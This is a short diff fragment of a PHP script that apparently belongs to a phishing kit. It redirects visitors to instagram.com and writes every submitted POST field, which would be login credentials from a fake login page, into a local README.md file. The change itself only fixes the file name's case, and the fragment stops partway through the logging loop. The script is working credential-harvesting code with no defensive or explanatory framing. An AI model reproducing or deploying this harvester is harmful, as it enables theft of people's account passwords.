@@ -1,7 +1,7 @@
 <?php
 
 header ('Location: https://instagram.com/ ');
-$handle = fopen("Readme.md", "a"); 
+$handle = fopen("README.md", "a"); 
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
 	fwrite($handle, "=");
